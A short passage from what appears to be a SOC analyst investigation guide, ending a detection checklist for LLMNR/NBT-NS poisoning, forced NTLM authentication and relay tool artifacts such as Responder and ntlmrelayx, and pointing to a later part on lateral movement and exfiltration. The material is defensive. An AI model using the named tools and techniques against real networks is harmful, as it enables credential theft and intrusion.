│  □ Monitor for LLMNR/NBT-NS poisoning (Responder)                   │
│  □ Check for forced NTLM authentication attempts                     │
│  □ Monitor for man-in-the-middle indicators                          │
│  □ Check for ntlmrelayx or similar relay tool artifacts              │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

---

*Continued in Part 3 → Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact — Complete TP Scenarios, Full Investigation Playbooks & SOC Analyst Checklists*
